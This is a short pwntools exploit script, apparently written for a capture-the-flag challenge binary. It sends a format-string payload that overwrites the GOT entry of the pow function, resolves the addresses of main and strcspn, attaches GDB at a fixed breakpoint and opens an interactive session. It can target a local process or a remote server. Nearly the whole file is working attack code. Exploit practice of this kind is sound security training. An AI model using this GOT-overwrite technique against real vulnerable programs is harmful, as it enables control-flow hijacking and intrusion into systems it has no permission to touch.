from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b vuln
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './chall'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()


offsets = 35
main = elf.sym['main']
pow_got = elf.got['pow']
strcsp_got = elf.got['strcspn']

log.info("main address: " + hex(main))
log.info("pow GOT address: " + hex(pow_got))
log.info("strcspn GOT address: " + hex(strcsp_got))


payload1 = b'1 %2082c%12$hn  '+ p64(pow_got)
payload2 = b'1 ' 
io.recvuntil('A: ')

io.sendline(payload1)

io.recvuntil('B: ')
io.sendline(payload2)

gdb.attach(io, gdbscript='''
init-pwndbg
b *0x00000000004008d7
continue
''')


io.interactive()